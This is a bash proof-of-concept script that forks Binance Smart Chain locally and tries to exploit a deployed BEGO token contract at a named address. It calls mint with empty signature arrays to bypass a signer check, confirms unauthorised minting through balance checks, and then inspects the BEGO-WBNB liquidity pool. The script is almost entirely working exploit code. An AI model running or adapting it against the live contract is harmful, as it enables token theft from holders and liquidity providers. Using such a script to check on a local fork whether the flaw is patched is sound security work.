#!/bin/bash

echo "=== BEGO Vulnerability Test with Anvil Fork ==="
echo ""

# Configuration
BEGO="0xc342774492b54ce5F8ac662113ED702Fc1b34972"
RPC="https://bsc-dataseed.binance.org/"
ANVIL_PORT=8547
ATTACKER="0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"  # Anvil default account

# Kill any existing Anvil instance
pkill anvil 2>/dev/null

echo "1. Starting Anvil fork of BSC..."
anvil --fork-url $RPC --port $ANVIL_PORT --chain-id 56 --accounts 1 &
ANVIL_PID=$!
sleep 3

LOCAL_RPC="http://localhost:$ANVIL_PORT"

echo "   Anvil started on port $ANVIL_PORT (PID: $ANVIL_PID)"
echo ""

echo "2. Getting current block info..."
BLOCK=$(cast block-number --rpc-url $LOCAL_RPC)
echo "   Forked at block: $BLOCK"
echo ""

echo "3. Checking BEGO contract..."
echo "   Address: $BEGO"

# Check total supply
SUPPLY=$(cast call $BEGO 'totalSupply()(uint256)' --rpc-url $LOCAL_RPC | xargs -I {} cast --to-unit {} ether)
echo "   Total Supply: $SUPPLY BEGO"

# Check attacker balance before
BALANCE_BEFORE=$(cast call $BEGO 'balanceOf(address)(uint256)' $ATTACKER --rpc-url $LOCAL_RPC)
echo "   Attacker balance before: $(cast --to-unit $BALANCE_BEFORE ether) BEGO"
echo ""

echo "4. Attempting to mint BEGO with empty signature arrays..."
echo "   This exploits the vulnerability where isSigners([]) returns true"
echo ""

# Prepare mint parameters
AMOUNT="1000000000000000000000"  # 1000 BEGO
TX_HASH="test_$(date +%s)"
RECEIVER=$ATTACKER

# Encode the mint function call with empty arrays
echo "   Encoding mint call..."
CALLDATA=$(cast abi-encode 'mint(uint256,string,address,bytes32[],bytes32[],uint8[])' \
    $AMOUNT \
    "$TX_HASH" \
    $RECEIVER \
    '[]' \
    '[]' \
    '[]')

# Function selector for mint
SELECTOR="0x94bf804d"

# Send the transaction
echo "   Sending mint transaction..."
TX_RESULT=$(cast send $BEGO "${SELECTOR}${CALLDATA:2}" \
    --from $ATTACKER \
    --rpc-url $LOCAL_RPC 2>&1)

if [[ $TX_RESULT == *"Transaction"* ]]; then
    echo "   ✅ Transaction sent!"
    
    # Check balance after
    BALANCE_AFTER=$(cast call $BEGO 'balanceOf(address)(uint256)' $ATTACKER --rpc-url $LOCAL_RPC)
    echo ""
    echo "5. Results:"
    echo "   Attacker balance after: $(cast --to-unit $BALANCE_AFTER ether) BEGO"
    
    if [ "$BALANCE_AFTER" != "$BALANCE_BEFORE" ]; then
        echo "   🚨 VULNERABILITY CONFIRMED! Tokens were minted!"
        MINTED=$(echo "scale=2; ($BALANCE_AFTER - $BALANCE_BEFORE) / 1000000000000000000" | bc)
        echo "   💰 Minted: $MINTED BEGO"
    else
        echo "   ✅ Vulnerability appears to be fixed - no tokens minted"
    fi
else
    echo "   ❌ Transaction failed"
    echo "   Error: $TX_RESULT"
    echo ""
    echo "   This could mean:"
    echo "   - The vulnerability has been patched"
    echo "   - The contract has additional checks"
    echo "   - Different parameters are needed"
fi

echo ""
echo "6. Checking BEGO-WBNB liquidity pool..."
PAIR="0x88503F48e437a377f1aC2892cBB3a5b09949faDd"
LIQUIDITY=$(cast call $BEGO 'balanceOf(address)(uint256)' $PAIR --rpc-url $LOCAL_RPC | xargs -I {} cast --to-unit {} ether)
echo "   BEGO in pool: $LIQUIDITY"

# Cleanup
echo ""
echo "Stopping Anvil..."
kill $ANVIL_PID 2>/dev/null

echo ""
echo "=== Test Complete ==="